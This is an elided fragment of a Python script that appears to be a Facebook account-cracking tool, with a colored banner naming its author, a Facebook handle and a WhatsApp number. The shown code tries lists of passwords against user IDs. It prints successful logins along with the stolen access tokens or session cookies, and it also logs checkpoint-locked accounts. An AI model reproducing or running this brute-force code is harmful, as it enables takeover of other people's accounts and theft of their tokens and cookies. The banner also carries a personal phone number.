...
\x1b[0;32m
 \x1b[0;33m
 \x1b[0;33m
\x1b[0;33m AUTHOR: ZANI CHAUDRY
\x1b[0;35m                                    
\x1b[0;33m FACEBOOK: AZAN X.
\x1b[0;34m
\x1b[0;33mwhatsapp: +923165456679
\x1b[0;33m""")
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] fast\033[1;97m [ \033[1;95m\033[1;97m]")
	...
	if method == "":
		...
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] choose password?? yes/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
		...
		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] choose password?? yes/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[SUCCESSFUL] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;96m[CHECKPOINT] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[SUCCESSFUL] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;96m[CHECKPOINT] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[SUCCESSFUL] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;96m[CHECKPOINT] %s|%s\033[0;91m        "%(uid, pw))
